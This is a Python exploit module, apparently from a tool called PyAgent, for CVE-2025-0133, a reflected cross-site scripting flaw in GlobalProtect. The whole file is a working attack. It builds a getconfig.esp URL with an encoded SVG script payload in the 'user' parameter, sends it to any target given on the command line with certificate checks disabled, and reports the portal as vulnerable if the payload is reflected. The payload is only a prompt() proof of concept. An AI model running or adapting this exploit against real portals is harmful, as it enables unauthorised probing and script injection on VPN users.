# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
CVE-2025-0133: GlobalProtect XSS Exploit.
Ported from 0xSojalSec collection.
"""

import requests
import warnings
from typing import Dict, Any

warnings.filterwarnings("ignore", category=UserWarning, module="urllib3")


class CVE20250133Exploit:
    """
    Exploit module for CVE-2025-0133 (GlobalProtect XSS).
    Reflects a payload via /ssl-vpn/getconfig.esp.
    """

    PAYLOAD_PATH = (
        "/ssl-vpn/getconfig.esp"
        "?client-type=1"
        "&protocol-version=p1"
        "&app-version=3.0.1-10"
        "&clientos=Linux"
        "&os-version=linux-64"
        "&hmac-algo=sha1%2Cmd5"
        "&enc-algo=aes-128-cbc%2Caes-256-cbc"
        "&authcookie=12cea70227d3aafbf25082fac1b6f51d"
        "&portal=us-vpn-gw-N"
        "&user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3E"
        "prompt%28%22mitsec%22%29%3C%2Fscript%3E%3C%2Fsvg%3E"
        "&domain=(empty_domain)"
        "&computer=computer"
    )

    def build_exploit_url(self, base_url: str) -> str:
        if base_url.endswith("/"):
            base_url = base_url[:-1]
        return base_url + self.PAYLOAD_PATH

    def check(self, target_url: str, timeout: int = 10) -> Dict[str, Any]:
        """
        Check if the target is vulnerable.
        Returns a dictionary with 'vulnerable', 'status_code', and 'message'.
        """
        full_url = self.build_exploit_url(target_url)
        try:
            response = requests.get(full_url, verify=False, timeout=timeout)
            status = response.status_code

            result = {"target": target_url, "vulnerable": False, "status_code": status, "message": ""}

            if status in [403, 401, 500]:
                result["message"] = "Access denied or server error (possible WAF/protection)."
            elif 'prompt("mitsec")' in response.text or "prompt('mitsec')" in response.text:
                result["vulnerable"] = True
                result["message"] = "XSS payload reflected! Vulnerable."
            else:
                result["message"] = "Payload not directly reflected."

            return result

        except requests.exceptions.RequestException as e:
            return {
                "target": target_url,
                "vulnerable": False,
                "status_code": -1,
                "message": f"Request failed: {str(e)}",
            }


# Usage example for testing
if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        exploit = CVE20250133Exploit()
        print(exploit.check(sys.argv[1]))
    else:
        print("Usage: python cve_2025_0133.py <url>")
